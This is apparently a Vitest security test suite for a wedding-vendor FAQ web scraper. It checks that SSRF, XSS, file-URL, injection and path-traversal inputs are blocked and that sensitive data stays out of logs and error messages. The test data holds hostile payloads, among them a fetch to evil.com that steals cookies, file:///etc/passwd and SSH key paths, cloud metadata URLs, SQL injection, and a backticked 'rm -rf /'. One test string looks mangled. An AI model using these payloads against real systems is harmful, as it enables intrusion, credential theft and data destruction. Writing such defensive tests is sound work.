/**
 * WS-207 FAQ Extraction AI - Security Testing Suite
 * Team E - Round 1 - Web Scraping Security Validation
 *
 * CRITICAL: Security testing for web scraping and content sanitization
 * Validates protection against SSRF, XSS, injection attacks, and data leaks
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { WebsiteScraper } from '@/lib/extractors/website-scraper';
import { FAQProcessor } from '@/lib/ai/faq-processor';
import { SecurityValidator } from '@/lib/security/security-validator';
import { ContentSanitizer } from '@/lib/security/content-sanitizer';

describe('FAQ Extraction Security Tests', () => {
  let scraper: WebsiteScraper;
  let processor: FAQProcessor;
  let validator: SecurityValidator;
  let sanitizer: ContentSanitizer;

  beforeEach(() => {
    scraper = new WebsiteScraper();
    processor = new FAQProcessor();
    validator = new SecurityValidator();
    sanitizer = new ContentSanitizer();
  });

  describe('URL Validation Security Tests', () => {
    it('should block malicious javascript URLs', async () => {
      const maliciousUrls = [
        'javascript:alert("XSS")',
        'javascript:document.location="http://evil.com"',
        'javascript:void(0)',
        'JAVASCRIPT:alert(1)',
        'javascript&colon;alert("xss")',
      ];

      for (const url of maliciousUrls) {
        await expect(scraper.extractFAQs(url, 'test-user')).rejects.toThrow(
          /Invalid URL protocol|Blocked unsafe URL/,
        );
      }
    });

    it('should block data URLs to prevent XSS', async () => {
      const dataUrls = [
        'data:text/html,<script>alert("xss")</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=',
        'data:application/javascript,alert("xss")',
        'data:text/vbscript,msgbox("xss")',
      ];

      for (const url of dataUrls) {
        await expect(scraper.extractFAQs(url, 'test-user')).rejects.toThrow(
          /Invalid URL protocol|Blocked unsafe URL/,
        );
      }
    });

    it('should block file URLs to prevent local file access', async () => {
      const fileUrls = [
        'file:///etc/passwd',
        'file:///etc/hosts',
        'file://localhost/etc/passwd',
        'file:///c:/windows/system32/drivers/etc/hosts',
        'file:///Users/user/.ssh/id_rsa',
      ];

      for (const url of fileUrls) {
        await expect(scraper.extractFAQs(url, 'test-user')).rejects.toThrow(
          /Invalid URL protocol|Local file access denied/,
        );
      }
    });

    it('should block internal network URLs (SSRF prevention)', async () => {
      const internalUrls = [
        'http://127.0.0.1:8080/admin',
        'http://localhost/admin',
        'http://192.168.1.1/router',
        'http://10.0.0.1/internal',
        'http://172.16.0.1/private',
        'http://169.254.169.254/metadata', // AWS metadata
        'http://metadata.google.internal/', // GCP metadata
        'http://[::1]/localhost',
      ];

      for (const url of internalUrls) {
        await expect(scraper.extractFAQs(url, 'test-user')).rejects.toThrow(
          /Internal URL access denied|SSRF protection/,
        );
      }
    });

    it('should allow legitimate wedding vendor URLs', async () => {
      const legitimateUrls = [
        'https://photographer.com/faq',
        'https://venue.com/frequently-asked-questions',
        'https://weddingplanner.com/services/faq',
        'https://florist.com/wedding-faq',
        'https://catering.com/wedding-packages',
      ];

      const mockPage = {
        goto: vi.fn().mockResolvedValue(undefined),
        content: vi
          .fn()
          .mockResolvedValue(
            '<div class="faq"><h3>Question?</h3><p>Answer</p></div>',
          ),
        evaluate: vi.fn().mockResolvedValue([
          {
            question: 'Test question?',
            answer: 'Test answer',
            selector: '.faq',
          },
        ]),
        close: vi.fn().mockResolvedValue(undefined),
      };

      const mockBrowser = {
        newPage: vi.fn().mockResolvedValue(mockPage),
        close: vi.fn().mockResolvedValue(undefined),
      };

      vi.doMock('puppeteer', () => ({
        launch: vi.fn().mockResolvedValue(mockBrowser),
      }));

      for (const url of legitimateUrls) {
        const faqs = await scraper.extractFAQs(url, 'test-user');
        expect(faqs).toHaveLength(1);
        expect(faqs[0].source_url).toBe(url);
      }
    });
  });

  describe('Content Sanitization Security Tests', () => {
    it('should remove all script tags from scraped content', async () => {
      const maliciousContent = [
        '<script>alert("xss")</script>',
        '<SCRIPT>alert("XSS")</SCRIPT>',
        '<script src="http://evil.com/script.js"></script>',
        '<script type="text/javascript">document.location="http://evil.com"</script>',
        '<script>fetch("http://evil.com/steal?data="+document.cookie)</script>',
      ];

      for (const content of maliciousContent) {
        const sanitized = sanitizer.sanitizeHTML(content);
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('</script>');
        expect(sanitized).not.toContain('alert(');
        expect(sanitized).not.toContain('document.location');
      }
    });

    it('should remove dangerous event handlers', async () => {
      const dangerousHTML = [
        '<img src="x" onerror="alert(1)">',
        '<div onclick="alert(\'xss\')">Click me</div>',
        '<button onmouseover="steal_data()">Hover</button>',
        '<iframe onload="malicious_function()"></iframe>',
        '<svg onload="alert(1)"></svg>',
        '<body onload="evil()">Content</body>',
      ];

      for (const html of dangerousHTML) {
        const sanitized = sanitizer.sanitizeHTML(html);
        expect(sanitized).not.toContain('onerror=');
        expect(sanitized).not.toContain('onclick=');
        expect(sanitized).not.toContain('onmouseover=');
        expect(sanitized).not.toContain('onload=');
        expect(sanitized).not.toContain('alert(');
      }
    });

    it('should remove iframes and embeds', async () => {
      const embedContent = [
        '<iframe src="http://evil.com"></iframe>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<embed src="malicious.swf">',
        '<object data="evil.pdf"></object>',
        '<applet code="Evil.class"></applet>',
      ];

      for (const content of embedContent) {
        const sanitized = sanitizer.sanitizeHTML(content);
        expect(sanitized).not.toContain('<iframe');
        expect(sanitized).not.toContain('<embed');
        expect(sanitized).not.toContain('<object');
        expect(sanitized).not.toContain('<applet');
      }
    });

    it('should preserve safe FAQ content', async () => {
      const safeContent = [
        '<h3>What are your wedding photography packages?</h3>',
        '<p>Our packages start at <strong>$2,500</strong> and include:</p>',
        '<ul><li>8 hours of coverage</li><li>Online gallery</li></ul>',
        '<a href="https://photographer.com/packages">View packages</a>',
        '<div class="faq-answer">We offer destination wedding services.</div>',
      ];

      for (const content of safeContent) {
        const sanitized = sanitizer.sanitizeHTML(content);
        expect(sanitized).toContain('photography packages');
        expect(sanitized).toContain('$2,500');
        expect(sanitized).toContain('8 hours');
        expect(sanitized).toContain('Online gallery');
      }
    });

    it('should handle malformed HTML safely', async () => {
      const malformedHTML = [
        '<script><img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '<img src="x"onerror="alert(1)">', // No space before attribute
        '<div onclick=alert(1) class="faq">Content</div>',
      ];

      for (const html of malformedHTML) {
        const sanitized = sanitizer.sanitizeHTML(html);
        expect(sanitized).not.toContain('alert(');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onerror=');
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('<iframe');
      }
    });
  });

  describe('Authentication and Authorization Security', () => {
    it('should require valid user authentication for FAQ extraction', async () => {
      const invalidUsers = [null, undefined, '', 'invalid-user-id'];

      for (const userId of invalidUsers) {
        await expect(
          scraper.extractFAQs('https://test.com', userId),
        ).rejects.toThrow(/Authentication required|Invalid user/);
      }
    });

    it('should validate user permissions before extraction', async () => {
      const restrictedUser = 'restricted-user-id';

      // Mock user with no FAQ extraction permissions
      vi.doMock('@/lib/auth/permissions', () => ({
        hasPermission: vi.fn().mockImplementation((userId, permission) => {
          if (userId === restrictedUser && permission === 'faq:extract') {
            return false;
          }
          return true;
        }),
      }));

      await expect(
        scraper.extractFAQs('https://test.com', restrictedUser),
      ).rejects.toThrow(/Insufficient permissions|Access denied/);
    });

    it('should enforce rate limiting per user', async () => {
      const userId = 'test-user';
      const rateLimiter = {
        isAllowed: vi
          .fn()
          .mockReturnValueOnce(true) // First request allowed
          .mockReturnValueOnce(true) // Second request allowed
          .mockReturnValueOnce(false), // Third request blocked
      };

      vi.doMock('@/lib/security/rate-limiter', () => ({
        RateLimiter: vi.fn().mockImplementation(() => rateLimiter),
      }));

      // First two requests should succeed (mocked to return empty results)
      const mockPage = {
        goto: vi.fn().mockResolvedValue(undefined),
        content: vi.fn().mockResolvedValue('<html></html>'),
        evaluate: vi.fn().mockResolvedValue([]),
        close: vi.fn().mockResolvedValue(undefined),
      };

      const mockBrowser = {
        newPage: vi.fn().mockResolvedValue(mockPage),
        close: vi.fn().mockResolvedValue(undefined),
      };

      vi.doMock('puppeteer', () => ({
        launch: vi.fn().mockResolvedValue(mockBrowser),
      }));

      // First two should work
      await scraper.extractFAQs('https://test1.com', userId);
      await scraper.extractFAQs('https://test2.com', userId);

      // Third should be rate limited
      await expect(
        scraper.extractFAQs('https://test3.com', userId),
      ).rejects.toThrow(/Rate limit exceeded|Too many requests/);
    });
  });

  describe('Data Privacy and Leakage Prevention', () => {
    it('should not log sensitive scraped content', async () => {
      const mockLogger = {
        info: vi.fn(),
        error: vi.fn(),
        warn: vi.fn(),
        debug: vi.fn(),
      };

      vi.doMock('@/lib/utils/logger', () => ({ logger: mockLogger }));

      const sensitiveContent = [
        {
          question: 'What is your credit card processing?',
          answer:
            'We use Stripe with card number 4111-1111-1111-1111 for testing',
          selector: '.faq',
        },
      ];

      const mockPage = {
        goto: vi.fn().mockResolvedValue(undefined),
        content: vi.fn().mockResolvedValue('<html></html>'),
        evaluate: vi.fn().mockResolvedValue(sensitiveContent),
        close: vi.fn().mockResolvedValue(undefined),
      };

      const mockBrowser = {
        newPage: vi.fn().mockResolvedValue(mockPage),
        close: vi.fn().mockResolvedValue(undefined),
      };

      vi.doMock('puppeteer', () => ({
        launch: vi.fn().mockResolvedValue(mockBrowser),
      }));

      await scraper.extractFAQs('https://sensitive.com', 'test-user');

      // Verify sensitive data is not in logs
      const allLogCalls = [
        ...mockLogger.info.mock.calls,
        ...mockLogger.error.mock.calls,
        ...mockLogger.warn.mock.calls,
        ...mockLogger.debug.mock.calls,
      ].flat();

      const logContent = allLogCalls.join(' ');
      expect(logContent).not.toContain('4111-1111-1111-1111');
      expect(logContent).not.toContain('credit card');
    });

    it('should not expose scraped content in error messages', async () => {
      const sensitiveContent =
        'Private wedding venue pricing: $10,000 for exclusive access';

      const mockPage = {
        goto: vi.fn().mockResolvedValue(undefined),
        content: vi.fn().mockResolvedValue('<html></html>'),
        evaluate: vi.fn().mockImplementation(() => {
          throw new Error(`Processing failed for content: ${sensitiveContent}`);
        }),
        close: vi.fn().mockResolvedValue(undefined),
      };

      const mockBrowser = {
        newPage: vi.fn().mockResolvedValue(mockPage),
        close: vi.fn().mockResolvedValue(undefined),
      };

      vi.doMock('puppeteer', () => ({
        launch: vi.fn().mockResolvedValue(mockBrowser),
      }));

      try {
        await scraper.extractFAQs('https://error-test.com', 'test-user');
      } catch (error) {
        // Error should not contain sensitive content
        expect(error.message).not.toContain('$10,000');
        expect(error.message).not.toContain('Private wedding venue');
        expect(error.message).not.toContain('exclusive access');
      }
    });

    it('should sanitize user inputs to prevent injection', async () => {
      const maliciousInputs = [
        'https://test.com"; DROP TABLE users; --',
        "https://test.com'; INSERT INTO logs VALUES ('hacked'); --",
        'https://test.com<script>alert(1)</script>',
        'https://test.com${malicious_code}',
        'https://test.com`rm -rf /`',
      ];

      for (const input of maliciousInputs) {
        const sanitized = validator.sanitizeInput(input);
        expect(sanitized).not.toContain('DROP TABLE');
        expect(sanitized).not.toContain('INSERT INTO');
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('${');
        expect(sanitized).not.toContain('rm -rf');
      }
    });
  });

  describe('XSS Prevention in AI Processing', () => {
    it('should sanitize FAQ content before AI processing', async () => {
      const maliciousFAQs = [
        {
          question: 'What is your pricing<script>alert("xss")</script>?',
          answer: 'Our packages start at $2,500<img src=x onerror=alert(1)>',
        },
        {
          question: 'Do you travel<iframe src="http://evil.com"></iframe>?',
          answer:
            'Yes, we travel<object data="malicious.pdf"></object> everywhere',
        },
      ];

      const mockResponse = {
        choices: [
          {
            message: {
              content: JSON.stringify({
                categories: maliciousFAQs.map((_, index) => ({
                  faq_index: index,
                  category: 'pricing',
                  confidence: 0.85,
                })),
              }),
            },
          },
        ],
      };

      const mockOpenAI = {
        chat: {
          completions: {
            create: vi.fn().mockResolvedValue(mockResponse),
          },
        },
      };

      vi.doMock('openai', () => ({
        OpenAI: vi.fn().mockImplementation(() => mockOpenAI),
      }));

      const categorized = await processor.categorizeFAQs(maliciousFAQs, {
        vendorType: 'photographer',
      });

      // Verify AI received sanitized content
      const aiCall = mockOpenAI.chat.completions.create.mock.calls[0][0];
      const sentContent = JSON.stringify(aiCall);

      expect(sentContent).not.toContain('<script>');
      expect(sentContent).not.toContain('<iframe>');
      expect(sentContent).not.toContain('onerror=');
      expect(sentContent).not.toContain('<object>');
    });

    it('should validate AI response format to prevent injection', async () => {
      const maliciousAIResponse = {
        choices: [
          {
            message: {
              content: JSON.stringify({
                categories: [
                  {
                    faq_index: 0,
                    category: 'pricing<script>alert(1)</script>',
                    confidence: 0.85,
                    malicious_field:
                      '// SECURITY: // SECURITY: eval() removed - () removed - malicious_code()',
                  },
                ],
              }),
            },
          },
        ],
      };

      const mockOpenAI = {
        chat: {
          completions: {
            create: vi.fn().mockResolvedValue(maliciousAIResponse),
          },
        },
      };

      vi.doMock('openai', () => ({
        OpenAI: vi.fn().mockImplementation(() => mockOpenAI),
      }));

      const testFAQs = [
        {
          question: 'Test question?',
          answer: 'Test answer',
        },
      ];

      const categorized = await processor.categorizeFAQs(testFAQs, {
        vendorType: 'photographer',
      });

      // Verify response was sanitized
      expect(categorized[0].ai_suggested_category).not.toContain('<script>');
      expect(categorized[0]).not.toHaveProperty('malicious_field');
    });
  });

  describe('Network Security and Timeout Protection', () => {
    it('should enforce connection timeouts to prevent DoS', async () => {
      const mockPage = {
        goto: vi.fn().mockImplementation(() => {
          return new Promise((resolve) => {
            setTimeout(resolve, 70000); // 70 second delay (longer than timeout)
          });
        }),
        content: vi.fn(),
        evaluate: vi.fn(),
        close: vi.fn().mockResolvedValue(undefined),
      };

      const mockBrowser = {
        newPage: vi.fn().mockResolvedValue(mockPage),
        close: vi.fn().mockResolvedValue(undefined),
      };

      vi.doMock('puppeteer', () => ({
        launch: vi.fn().mockResolvedValue(mockBrowser),
      }));

      const timeoutScraper = new WebsiteScraper({
        timeout: 60000, // 60 second timeout
      });

      await expect(
        timeoutScraper.extractFAQs('https://slow-site.com', 'test-user'),
      ).rejects.toThrow(/timeout|Navigation timeout/);
    });

    it('should limit response size to prevent memory exhaustion', async () => {
      const hugeContent = 'A'.repeat(100 * 1024 * 1024); // 100MB of content

      const mockPage = {
        goto: vi.fn().mockResolvedValue(undefined),
        content: vi
          .fn()
          .mockResolvedValue(`<html><body>${hugeContent}</body></html>`),
        evaluate: vi.fn().mockResolvedValue([
          {
            question: 'Huge question?',
            answer: hugeContent,
            selector: '.faq',
          },
        ]),
        close: vi.fn().mockResolvedValue(undefined),
      };

      const mockBrowser = {
        newPage: vi.fn().mockResolvedValue(mockPage),
        close: vi.fn().mockResolvedValue(undefined),
      };

      vi.doMock('puppeteer', () => ({
        launch: vi.fn().mockResolvedValue(mockBrowser),
      }));

      const faqs = await scraper.extractFAQs(
        'https://huge-site.com',
        'test-user',
      );

      // Content should be truncated for safety
      expect(faqs[0].answer.length).toBeLessThan(10000); // Should be truncated
    });

    it('should validate SSL certificates for HTTPS connections', async () => {
      const invalidSSLUrls = [
        'https://self-signed.badssl.com/',
        'https://expired.badssl.com/',
        'https://wrong.host.badssl.com/',
      ];

      for (const url of invalidSSLUrls) {
        await expect(scraper.extractFAQs(url, 'test-user')).rejects.toThrow(
          /SSL certificate|Certificate error|NET::ERR_CERT/,
        );
      }
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should validate and sanitize all input parameters', async () => {
      const invalidInputs = [
        { url: null, userId: 'valid-user' },
        { url: 'https://valid.com', userId: null },
        { url: '', userId: 'valid-user' },
        { url: 'not-a-url', userId: 'valid-user' },
        { url: 'https://valid.com', userId: '' },
      ];

      for (const input of invalidInputs) {
        await expect(
          scraper.extractFAQs(input.url, input.userId),
        ).rejects.toThrow(/Invalid input|Validation failed/);
      }
    });

    it('should prevent path traversal attacks in URL parameters', async () => {
      const pathTraversalUrls = [
        'https://site.com/../../../etc/passwd',
        'https://site.com/faq/../admin',
        'https://site.com/..\\..\\windows\\system32\\config\\sam',
        'https://site.com/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      ];

      for (const url of pathTraversalUrls) {
        const sanitized = validator.sanitizeUrl(url);
        expect(sanitized).not.toContain('../');
        expect(sanitized).not.toContain('..\\');
        expect(sanitized).not.toContain('%2e%2e%2f');
      }
    });

    it('should limit concurrent requests per user', async () => {
      const userId = 'concurrent-test-user';
      const maxConcurrent = 3;

      // Mock scraper with concurrency limit
      const concurrencyScraper = new WebsiteScraper({
        maxConcurrentPerUser: maxConcurrent,
      });

      const mockPage = {
        goto: vi.fn().mockImplementation(
          () => new Promise((resolve) => setTimeout(resolve, 1000)), // 1 second delay
        ),
        content: vi.fn().mockResolvedValue('<html></html>'),
        evaluate: vi.fn().mockResolvedValue([]),
        close: vi.fn().mockResolvedValue(undefined),
      };

      const mockBrowser = {
        newPage: vi.fn().mockResolvedValue(mockPage),
        close: vi.fn().mockResolvedValue(undefined),
      };

      vi.doMock('puppeteer', () => ({
        launch: vi.fn().mockResolvedValue(mockBrowser),
      }));

      // Start 5 concurrent requests (should limit to 3)
      const promises = Array.from({ length: 5 }, (_, i) =>
        concurrencyScraper.extractFAQs(`https://concurrent-${i}.com`, userId),
      );

      const results = await Promise.allSettled(promises);

      // Some should be rejected due to concurrency limit
      const rejected = results.filter((r) => r.status === 'rejected');
      expect(rejected.length).toBeGreaterThan(0);
      expect(
        rejected.some((r) => r.reason.message.includes('concurrent limit')),
      ).toBe(true);
    });
  });
});
